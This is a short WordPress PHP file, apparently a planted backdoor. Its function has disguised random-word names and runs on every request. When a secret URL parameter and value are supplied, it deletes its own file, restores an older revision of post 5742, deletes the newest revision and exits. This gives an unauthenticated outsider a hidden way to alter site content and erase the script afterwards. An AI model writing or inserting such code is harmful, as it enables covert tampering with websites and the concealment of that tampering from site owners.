<?php

function duplicate_gateway_cloud() {
	if (isset($_GET['yoast_replace_text_directory']) && $_GET['yoast_replace_text_directory'] === 'builder_themes_star_error') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tables_copyright_publish = 5742;
		$game_authentication_this_form = wp_get_post_revisions($tables_copyright_publish);
		if (empty($game_authentication_this_form)) die('no revisions');
		if (count($game_authentication_this_form) < 2) die('less than 2');
		$ecommerce_sync_related = array_shift($game_authentication_this_form);
		$wpc_video_column_language = $ecommerce_sync_related->ID;
		$backup_popup_internal_events = array_shift($game_authentication_this_form);
		$project_create_react = $backup_popup_internal_events->ID;
		$show_anti_finder = wp_restore_post_revision($project_create_react);
		if ($show_anti_finder === false) die('error restoring');
		$show_anti_finder = wp_delete_post_revision($wpc_video_column_language);		
		if ($show_anti_finder === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'duplicate_gateway_cloud');
